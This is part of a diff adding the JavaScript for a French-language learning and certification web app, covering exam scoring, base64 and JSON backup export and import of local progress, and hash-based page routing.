+  var r = document.getElementById('er');
+  r.className = 'res ' + (pass ? 'g' : 'r');
+  r.textContent = pass ? '🎉 ' + correct + '/' + e.qs.length + ' (' + pct + '%)' : correct + '/' + e.qs.length + ' (' + pct + '%) — Il faut ' + req + '%';
+}
+
+function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch(e) { return ''; } }
+function unb64(b) { try { return decodeURIComponent(escape(atob(b.replace(/\s/g,'')))); } catch(e) { return null; } }
+function exportCode() { return b64(JSON.stringify(state)); }
+function importCode(c) { var j = unb64(c.trim()); if (!j) return false; try { var d = JSON.parse(j); if (!d) return false; state = Object.assign({}, state, d); save(); return true; } catch(e) { return false; } }
+function dlBackup() { var b = new Blob([JSON.stringify(state, null, 2)], {type:'application/json'}); var url = URL.createObjectURL(b); var a = document.createElement('a'); a.href = url; a.download = 'mdpc-n5-' + today() + '.json'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); }
+function readFile(input) { var f = input.files[0]; if (!f) return; var r = new FileReader(); r.onload = function(e) { try { var d = JSON.parse(e.target.result); state = Object.assign({}, state, d); save(); alert('Restauré !'); route(); } catch(err) { alert('Invalide'); } }; r.readAsText(f); }
+
+function renderSync() {
+  var code = exportCode();
+  var html = '<div class="card"><h2>🌐 Sync</h2></div>';
+  html += '<div class="card"><h3>📋 Code</h3><div class="sync-box"><label>Ton code</label><textarea id="so" readonly onclick="this.select()">' + code + '</textarea><div style="margin-top:8px"><button onclick="copyCode()">Copier</button></div></div>';
+  html += '<div class="sync-box"><label>Coller un code</label><textarea id="si" placeholder="Colle ici..."></textarea><div style="margin-top:8px"><button class="green" onclick="applyCode()">Restaurer</button></div></div></div>';
+  html += '<div class="card"><h3>💾 Fichier</h3><div style="display:flex;gap:8px;flex-wrap:wrap"><button onclick="dlBackup()">Télécharger</button><input type="file" id="bf" accept=".json" style="display:none" onchange="readFile(this)"><button class="sec" onclick="document.getElementById(\'bf\').click()">Importer</button></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+function copyCode() { var ta = document.getElementById('so'); ta.select(); try { document.execCommand('copy'); alert('Copié !'); } catch(e) { alert('Manuel'); } }
+function applyCode() { var c = document.getElementById('si').value; if (!c.trim()) { alert('Colle un code.'); return; } if (importCode(c)) { alert('Restauré !'); route(); } else alert('Code invalide.'); }
+
+function route() {
+  try {
+    header();
+    if (!state.currentUser) { renderLogin(); return; }
+    if (!isUnlocked(5)) { renderLocked(); return; }
+    var h = (location.hash || '#home').slice(1);
+    var p = h.split('/');
+    if (p[0] === 'home' || p[0] === '') return renderHome();
+    if (p[0] === 'defi' && p[1]) return renderDefi(parseInt(p[1]));
+    if (p[0] === 'certif') return renderCertif();
+    if (p[0] === 'cv') return renderCV();
+    if (p[0] === 'stats') return renderStats();
+    if (p[0] === 'jobs') return renderJobs();
+    if (p[0] === 'examens') return renderExamens();
+    if (p[0] === 'examen' && p[1]) return renderExamen(p[1]);
+    if (p[0] === 'certs') return renderCerts();
+    if (p[0] === 'sync') return renderSync();
+    renderHome();
+  } catch(e) {
+    console.error('Route error:', e);
+    document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur</h2><p style="color:#ef4444">' + e.message + '</p><pre style="color:#fca5a5;font-size:.8em;white-space:pre-wrap">' + (e.stack || '') + '</pre></div>';
+  }
+}
+window.addEventListener('hashchange', route);
+try { route(); } catch(e) {
+  document.getElementById('app').innerHTML = '<div class="card"><h2 style="color:#ef4444">Erreur init</h2><p style="color:#ef4444">' + e.message + '</p></div>';
+}
+</script>
+</body>
+</html>
